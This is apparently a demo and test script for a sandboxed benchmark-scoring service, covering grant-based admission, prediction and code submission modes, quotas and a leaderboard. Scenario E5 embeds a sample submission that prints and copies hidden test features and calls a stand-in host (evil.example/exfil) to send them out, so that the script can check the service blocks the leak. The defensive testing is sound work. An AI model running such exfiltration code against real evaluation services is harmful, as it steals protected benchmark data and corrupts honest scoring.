"""评测服务演示（E 系列）：数据集不出的基准打分——准入、双模式执行、防泄题三闸门。

场景：
  E1 公开能力 benchmark_info 免票（橱窗）→ 放行
  E2 无票提交 eval.submit → 拒（保险柜）
  E3 持域 grant（模式 A：交预测）→ host 打分返回 + 榜单
  E4 模式 B（交代码）：沙盒内读隐藏特征产出预测 → 只回分数（标签永不进容器）
  E5 渗透尝试：代码 print 特征全文 + 把特征写进产物 + 网络外传——三路全被闸门挡住，
     返回值只有分数（断言响应不含特征/产物/stdout）
  E6 配额：max_uses=3 的 grant 第 4 次提交 → quota-exhausted
  E7 榜单公开可查

    cd yanshu-AIC && python acps_cluster/delegation/demo_eval.py
"""

import os as _os
import sys as _sys

_HERE = _os.path.dirname(_os.path.abspath(__file__))
_sys.path[:] = [p for p in _sys.path if _os.path.abspath(p or _os.getcwd()) != _HERE]
del _os, _sys, _HERE

import asyncio  # noqa: E402
import json  # noqa: E402
import shutil  # noqa: E402
import sys  # noqa: E402
import tempfile  # noqa: E402
from pathlib import Path  # noqa: E402

PROJECT = Path(__file__).resolve().parents[2]
CLUSTER = PROJECT / "acps_cluster"
for _p in (str(PROJECT), str(CLUSTER)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from delegation.demo_domain import (  # noqa: E402  复用姊妹篇骨架
    EXP_WS, SUPERVISOR_WS, TRUST, _acps_config, _record, _send, _state, ROWS,
)

import eval_runner  # noqa: E402
import partner_eval  # noqa: E402
from delegation import (  # noqa: E402
    build_manifest, issue_grant, load_signing_context, sign_manifest, verify_manifest, write_manifest,
)

EVAL_WS = CLUSTER / "ws-eval"
EVAL_AIC = "1.2.156.3088.1.1.EVAL01.AGENT01.RUN01.0ZBR"
LEADER_AIC = json.loads((SUPERVISOR_WS / "acps" / "enrollment.json").read_text(encoding="utf-8"))["identity"]["ref"]["aic"]
EXP_AIC = json.loads((EXP_WS / "acps" / "enrollment.json").read_text(encoding="utf-8"))["identity"]["ref"]["aic"]
CRITIC_AIC = "1.2.156.3088.1.1.BJ5X2N.QYTBJJ.6GH1CI.12KL"
CRITIC_WS = CLUSTER / "ws-critic"

DOMAIN = "yanshu-eval"
PORT_EVAL = 18801
SUBMIT_SKILL = "eval.submit"
INFO_SKILL = "eval.benchmark_info"


def _manifest(*, revision=1):
    return build_manifest(
        domain_id=DOMAIN,
        members=[
            {"aic": EVAL_AIC, "role": "provider"},
            {"aic": EXP_AIC, "role": "consumer"},
            {"aic": LEADER_AIC, "role": "auditor"},  # 签发者必须是域成员（章程不变量）
        ],
        assets=[{"providerAic": EVAL_AIC, "skill": SUBMIT_SKILL, "allowedMembers": ["consumer"]}],
        issuers=[LEADER_AIC],
        revision=revision,
    )


async def _serve(manifests, audit: Path, tmp: Path):
    import os

    os.environ["ACPS_PEP_ENABLED"] = "1"
    os.environ["ACPS_PEP_LEADER_AICS"] = LEADER_AIC
    os.environ["ACPS_PEP_AUDIT_PATH"] = str(audit)
    os.environ["ACPS_PEP_DOMAINS_DIR"] = str(tmp / "domains")
    os.environ["ACPS_PEP_QUOTA_PATH"] = str(tmp / "quota.sqlite3")
    domains = tmp / "domains"
    domains.mkdir(parents=True, exist_ok=True)
    for m in manifests:
        write_manifest(m, domains)
    from wit import WitRuntime

    ws = tmp / "ws-eval"
    shutil.copytree(EVAL_WS / "acps", ws / "acps")
    audit.parent.mkdir(parents=True, exist_ok=True)
    audit.write_text("", encoding="utf-8")
    runtime = WitRuntime(partner_eval.build_eval_agent(None), workspace=ws, acps=_acps_config(PORT_EVAL))
    status = await runtime.serve_direct_partner(host="127.0.0.1", port=PORT_EVAL, amp=False)
    print(f"[eval] :{PORT_EVAL} → {status.status}")
    return runtime


HONEST_CODE = """\
import json, csv

rows = list(csv.DictReader(open('/eval/input.csv')))
# 规则基线：x0+x1>0 判 1（数据含 8% 标签噪声，理论上限 ~92%）
preds = [1 if float(r['x0']) + float(r['x1']) > 0 else 0 for r in rows]
json.dump(preds, open('predictions.json', 'w'))
print('done', len(preds))
"""

EXFIL_CODE = """\
import json, csv, urllib.request

# 渗透尝试 ①：把特征全文 print 到 stdout（赌 stdout 会回传）
data = open('/eval/input.csv').read()
print('STOLEN-FEATURES:', data[:200])

# 渗透尝试 ②：把特征写进产物文件（赌产物会回传）
open('stolen.csv', 'w').write(data)

# 渗透尝试 ③：网络外传（容器 network=none，必败，走个过场）
try:
    urllib.request.urlopen('https://evil.example/exfil', timeout=3)
except Exception as exc:
    print('network blocked:', type(exc).__name__)

# 但预测照常产出——评测服务应当正常打分（防泄题≠拒绝服务）
rows = list(csv.DictReader(open('/eval/input.csv')))
preds = [1 if float(r['x0']) + float(r['x1']) > 0 else 0 for r in rows]
json.dump(preds, open('predictions.json', 'w'))
"""

FEATURES_HEAD = None  # 在 main 里取真实特征前 40 字符做断言


async def main() -> None:
    bench = eval_runner.ensure_demo_benchmark(rows=60, seed=42)
    global FEATURES_HEAD
    FEATURES_HEAD = (bench / "input.csv").read_text(encoding="utf-8").splitlines()[1][:40]
    board_path = eval_runner.LEADERBOARD_PATH
    board_path.parent.mkdir(parents=True, exist_ok=True)
    board_path.write_text("[]", encoding="utf-8")

    m1 = _manifest()
    m1 = sign_manifest(m1, load_signing_context(SUPERVISOR_WS / "acps" / "client", trust_bundle=TRUST))
    m1 = sign_manifest(m1, load_signing_context(EVAL_WS / "acps" / "client", trust_bundle=TRUST))
    body, signers = verify_manifest(m1, trust_bundle=TRUST)
    _record("E0 评测域章程（eval 为 provider，双签）", "2 签名方", f"{len(signers)} 签名方")

    tmp = Path(tempfile.mkdtemp(prefix="eval-demo-"))
    out = CLUSTER / "demo_run" / "eval"
    out.mkdir(parents=True, exist_ok=True)
    audit = out / "eval-audit.jsonl"
    runtime = await _serve([m1], audit, tmp)
    leader_signing = load_signing_context(SUPERVISOR_WS / "acps" / "client", trust_bundle=TRUST)
    try:
        # E1 公开橱窗
        resp = await _send(CRITIC_WS, CRITIC_AIC, PORT_EVAL, EVAL_AIC, skill=INFO_SKILL)
        _record("E1 公开 benchmark_info 免票", "task accepted", _state(resp))

        # E2 无票提交
        resp = await _send(CRITIC_WS, CRITIC_AIC, PORT_EVAL, EVAL_AIC, skill=SUBMIT_SKILL)
        _record("E2 无票提交 eval.submit", "task rejected", _state(resp))

        # E3 模式 A：交预测（构造 60 条：完美规则预测 ≈ 92%）
        grant = issue_grant(
            leader_signing, domain=DOMAIN, domain_revision=1, subject_aic=EXP_AIC,
            assets=[{"providerAic": EVAL_AIC, "skill": SUBMIT_SKILL}], max_uses=3, ttl_seconds=3600,
        )
        preds = [1 if sum(float(v) for v in line.split(",")) > 0 else 0
                 for line in (bench / "input.csv").read_text().splitlines()[1:] if line]
        result = await partner_eval.eval_submit(
            mode="predictions", benchmark="demo-cls", predictions=preds, submitter=EXP_AIC)
        _record("E3 模式A 交预测→host 打分", "score≈0.92",
                f"score={result.get('score')}",
                f"粒度={result.get('scoreGranularity')}（不给逐行边际反馈）"
                f" 归属={result.get('submitter')} 已验证={result.get('submitterVerified')}")

        # E3b 持票 wire 准入（真 mTLS L2）
        resp = await _send(EXP_WS, EXP_AIC, PORT_EVAL, EVAL_AIC, skill=SUBMIT_SKILL, token=grant.token)
        _record("E3b 持域 grant 提交（wire L2）", "task accepted", _state(resp))

        # E4 模式 B：交代码（沙盒，标签永不进容器）
        result = await partner_eval.eval_submit(
            mode="code", benchmark="demo-cls", files={"main.py": HONEST_CODE}, submitter=EXP_AIC)
        _record("E4 模式B 交代码→沙盒打分", "score≈0.92", f"score={result.get('score')}",
                f"runId={result.get('runId')} duration={result.get('durationSeconds')}s")

        # E5 渗透尝试：三路外传 + 正常预测
        result = await partner_eval.eval_submit(
            mode="code", benchmark="demo-cls", files={"main.py": EXFIL_CODE}, submitter=EXP_AIC)
        blob = json.dumps(result, ensure_ascii=False)
        leaked = FEATURES_HEAD in blob or "stolen.csv" in blob or "STOLEN" in blob or "stdout" in result
        ok5 = result.get("ok") and not leaked
        _record("E5 渗透尝试（print/产物/网络）被三闸门挡住", "只回分数", 
                "只回分数" if ok5 else f"泄露！{blob[:120]}",
                f"score={result.get('score')}（渗透者仍正常得分：防泄题≠拒服务）")
        # stdout 原文仅落本地审计日志（评测方可查）
        stdout_log = eval_runner.EVAL_RUNS_DIR / f"run-{result.get('runId')}" / "stdout.log"
        if stdout_log.is_file():
            (out / "exfil-stdout-local-audit.log").write_text(stdout_log.read_text(encoding="utf-8"), encoding="utf-8")

        # E6 配额：max_uses=3 对 wire 准入计数（E3b 已用 1）——第 2/3 次放行、第 4 次拒
        states = []
        for _ in range(3):
            resp = await _send(EXP_WS, EXP_AIC, PORT_EVAL, EVAL_AIC, skill=SUBMIT_SKILL, token=grant.token)
            states.append(_state(resp))
        _record("E6 配额第 4 次提交", "accepted,accepted,rejected", ",".join(states),
                "能力直调（同进程）不经 PEP 配额；配额作用于 wire 准入")

        # E7 榜单
        board = await partner_eval.eval_leaderboard()
        _record("E7 榜单公开可查", ">=3 条", f"{len(board.get('leaderboard', []))} 条")
    finally:
        await runtime.stop_serving()
        shutil.rmtree(tmp, ignore_errors=True)

    print("\n════════════════ 评测服务（E 系列）结果 ════════════════")
    def _ok(row):
        e, g = row["expected"], row["outcome"]
        if "签名方" in e:
            return g.startswith(e)
        if e == "只回分数":
            return g == e
        if e.startswith("score"):
            return "0.9" in str(g)
        if e == ">=3 条":
            return str(g).rstrip(" 条").isdigit() and int(str(g).rstrip(" 条")) >= 3
        e2, g2 = e.replace("task ", ""), g.replace("task ", "")
        return g2 == e2 or (e2 == "accepted" and g2 in {"accepted", "working"})
    passed = 0
    for row in ROWS:
        good = _ok(row)
        passed += good
        print(f"{'✅' if good else '❌'} {row['scenario']}")
        print(f"    期望 {row['expected']} / 实际 {row['outcome']}  {row['note'][:90]}")
    print(f"\n[eval] 通过 {passed}/{len(ROWS)}；产物在 {out}")


if __name__ == "__main__":
    asyncio.run(main())
